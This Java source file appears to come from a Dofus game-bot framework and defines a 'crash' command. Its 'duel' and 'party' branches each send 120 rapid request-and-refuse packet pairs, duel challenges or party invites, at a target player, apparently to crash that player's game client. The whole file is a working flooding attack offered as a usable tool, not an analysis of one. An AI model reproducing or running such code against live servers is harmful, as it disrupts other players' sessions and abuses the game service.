package fr.aresrpg.eratz.domain.command;

import static fr.aresrpg.tofumanchou.domain.Manchou.LOGGER;

import fr.aresrpg.commons.domain.concurrent.Threads;
import fr.aresrpg.dofus.protocol.game.actions.GameActions;
import fr.aresrpg.dofus.protocol.game.actions.client.GameDuelAction;
import fr.aresrpg.dofus.protocol.game.actions.client.GameRefuseDuelAction;
import fr.aresrpg.dofus.protocol.game.client.GameClientActionPacket;
import fr.aresrpg.dofus.protocol.party.PartyRefusePacket;
import fr.aresrpg.dofus.protocol.party.client.PartyInvitePacket;
import fr.aresrpg.dofus.structures.server.Server;
import fr.aresrpg.eratz.domain.BotFather;
import fr.aresrpg.eratz.domain.data.player.BotPerso;
import fr.aresrpg.tofumanchou.domain.Accounts;
import fr.aresrpg.tofumanchou.domain.command.Command;
import fr.aresrpg.tofumanchou.domain.data.entity.Entity;
import fr.aresrpg.tofumanchou.domain.data.entity.player.Perso;

import java.util.concurrent.TimeUnit;

/**
 * 
 * @since
 */
public class CrashCommand implements Command {

	@Override
	public String getCmd() {
		return "crash";
	}

	@Override
	public void trigger(String[] args) {
		if (args.length != 0) {
			if (args.length > 3)
				switch (args[0]) {
				case "duel":
					Perso perso = Accounts.getPersoWithPseudo(args[1], Server.valueOf(args[2].toUpperCase()));
					if (perso == null) {
						LOGGER.error("Player not found");
						return;
					}
					Entity entity = perso.getMap().getEntities().get(Long.parseLong(args[3]));
					if (entity == null) {
						LOGGER.error("Entity not found");
						return;
					}
					BotPerso bp = BotFather.getPerso(perso);
					int count = 0;
					while (++count < 120) {
						Threads.uSleep(50, TimeUnit.MILLISECONDS); // gentil cpu ! pas cramer !
						GameDuelAction action = new GameDuelAction(entity.getUUID());
						GameClientActionPacket ga = new GameClientActionPacket(GameActions.DUEL, action);
						bp.sendPacketToServer(ga);
						Threads.uSleep(2, TimeUnit.MILLISECONDS);
						GameRefuseDuelAction actionr = new GameRefuseDuelAction();
						actionr.setTargetId(perso.getUUID());
						bp.sendPacketToServer(new GameClientActionPacket(GameActions.REFUSE_DUEL, actionr));
					}
					return;
				case "party":
					Perso perso1 = Accounts.getPersoWithPseudo(args[1], Server.valueOf(args[2].toUpperCase()));
					if (perso1 == null) {
						LOGGER.error("Player not found");
						return;
					}
					BotPerso bp1 = BotFather.getPerso(perso1);
					int count1 = 0;
					while (++count1 < 120) {
						Threads.uSleep(3, TimeUnit.MILLISECONDS);
						PartyInvitePacket pkt = new PartyInvitePacket();
						pkt.setPname(args[3]);
						bp1.sendPacketToServer(pkt);
						Threads.uSleep(3, TimeUnit.MILLISECONDS);
						PartyRefusePacket ref = new PartyRefusePacket();
						bp1.sendPacketToServer(ref);
					}
					return;
			}
		}
		LOGGER.error("Usage: crash <party|duel> <perso> <server> <target-name>");
	}

}
